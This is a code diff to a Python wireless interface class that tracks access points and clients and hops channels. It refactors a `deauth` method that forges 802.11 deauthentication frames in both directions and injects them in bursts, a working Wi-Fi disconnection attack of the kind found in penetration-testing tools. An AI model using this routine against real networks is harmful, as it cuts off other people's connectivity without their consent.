@@ -1,3 +1,5 @@
+"""The device-agnostic 802.11 interface (``WlanInterface``): builds the AP/client registry
+from parsed RX frames, drives channel hopping, and injects raw frames via a chipset driver."""
 import asyncio
 import logging
 import time
@@ -69,7 +71,7 @@ class WlanInterface:
         self.pid = pid
         self.dev = dev
         self.current_channel = 1
-        
+
         self.access_points: Dict[str, AccessPoint] = {}
         self.clients: Dict[str, Client] = {}
 
@@ -242,7 +244,7 @@ class WlanInterface:
             client_mac = None
             source = parsed.get("source")
             dest = parsed.get("dest")
-            
+
             if frame_type == "probe_req":
                 client_mac = source
             else:
@@ -251,7 +253,7 @@ class WlanInterface:
                     client_mac = source
                 elif dest and dest != bssid:
                     client_mac = dest
-            
+
             if client_mac and client_mac != "ff:ff:ff:ff:ff:ff" and client_mac not in self.forged_macs:
                 if client_mac not in self.clients:
                     self.clients[client_mac] = Client(
@@ -272,13 +274,13 @@ class WlanInterface:
                 if frame_type in ("assoc_req", "reassoc_req", "data", "wep_data", "eapol"):
                     if bssid:
                         client.bssid = bssid
-                    
+
                 # Track probed SSIDs
                 if frame_type == "probe_req":
                     ssid = parsed.get("ssid")
                     if ssid and ssid != "<hidden>":
                         client.probed_ssids.add(ssid)
-                        
+
                 # Decloak via Assoc Req
                 if frame_type == "assoc_req" and bssid in self.access_points:
                     ssid = parsed.get("ssid")
@@ -561,52 +563,41 @@ class WlanInterface:
             pass
 
     async def deauth(self, ap_bssid: str, client_bssid: str, burst_count: int = 10):
-        """
-        Sends a burst of Deauthentication frames to the AP and the Client.
-        """
+        """Inject a burst of deauth frames spoofing both directions (AP→client and client→AP)."""
         ap_bssid = ap_bssid.lower()
         client_bssid = client_bssid.lower()
-        
-        # 1. Get the target channel
+
         target_chan = self.current_channel
         if ap_bssid in self.access_points:
             target_chan = self.access_points[ap_bssid].channel
-            print(f"[DEAUTH] Found AP {ap_bssid} on channel {target_chan}.")
         else:
-            print(f"[DEAUTH] AP {ap_bssid} not in registry. Defaulting to channel {target_chan}.")
+            logger.debug("[DEAUTH] %s not in registry; deauthing on current channel %d",
+                         ap_bssid, target_chan)
 
-        import struct
-        
-        def _str_to_mac(mac_str: str) -> bytes:
-            return bytes(int(x, 16) for x in mac_str.split(':'))
-            
-        ap_mac = _str_to_mac(ap_bssid)
-        cl_mac = _str_to_mac(client_bssid)
-        
-        # Frame Control: 0xC0 (Deauth, Mgmt), Flags: 0x00
-        # Duration: 0x0000 (Let hardware fill if needed, or leave 0)
-        # Reason Code: 7 (Class 3 frame received from nonassociated STA)
-        fc_dur = b'\xc0\x00\x00\x00'
-        reason = struct.pack("<H", 7)
-        seq = b'\x00\x00' # Hardware usually overwrites seq
-        
-        # 1. Deauth the Client (Spoofing the AP)
-        # Addr1=Dest(Client), Addr2=Source(AP), Addr3=BSSID(AP)
+        ap_mac = self._to_mac_bytes(ap_bssid)
+        cl_mac = self._to_mac_bytes(client_bssid)
+
+        # Frame Control: 0xC0 (Deauth, Mgmt), Flags: 0x00. Duration 0 (hardware fills).
+        # Reason Code 7 (class-3 frame from nonassociated STA), little-endian u16.
+        fc_dur = b"\xc0\x00\x00\x00"
+        reason = b"\x07\x00"
+        seq = b"\x00\x00"  # hardware overwrites the sequence number
+
+        # Client deauth spoofs the AP as source; AP deauth spoofs the client.
+        # Addr1=Dest, Addr2=Source, Addr3=BSSID(AP) in both.
         client_deauth = fc_dur + cl_mac + ap_mac + ap_mac + seq + reason
-        
-        # 2. Deauth the AP (Spoofing the Client)
-        # Addr1=Dest(AP), Addr2=Source(Client), Addr3=BSSID(AP)
         ap_deauth = fc_dur + ap_mac + cl_mac + ap_mac + seq + reason
-        
-        logger.info(f"Injecting Deauth Burst ({burst_count}x) on CH {target_chan}: {ap_bssid} <-> {client_bssid}")
-        
+
+        logger.info(f"Injecting Deauth Burst ({burst_count}x) on CH {target_chan}: "
+                    f"{ap_bssid} <-> {client_bssid}")
+
         # use_no_ack: we're spoofing, so ACKs would go to the real targets and trigger
         # endless hardware retries.
-        for i in range(burst_count):
+        for _ in range(burst_count):
             await self.send_raw(client_deauth, use_no_ack=True)
             await self.send_raw(ap_deauth, use_no_ack=True)
             await asyncio.sleep(0.01)
-            
+
 
     async def start_hopping(self, channels: List[int] = None, interval: float = 0.5):
         """Spawns an asyncio task to loop through channels.
